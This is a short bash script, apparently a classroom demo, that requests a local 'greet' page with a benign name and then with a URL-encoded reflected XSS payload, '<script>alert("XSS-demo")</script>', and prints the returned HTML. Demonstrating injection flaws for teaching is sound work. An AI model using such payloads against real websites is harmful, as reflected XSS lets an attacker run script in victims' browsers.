#!/usr/bin/env bash
TARGET=${1:-http://127.0.0.1:8000}
echo "[*] Visiting greet with benign name"
curl -s "${TARGET}/greet?name=Student" | sed -n '1,20p'
echo
echo "[*] Visiting greet with XSS payload (for demo only)"
PAYLOAD='<script>alert("XSS-demo")</script>'
echo "URL: ${TARGET}/greet?name=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")"
curl -s "${TARGET}/greet?name=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")" | sed -n '1,40p'
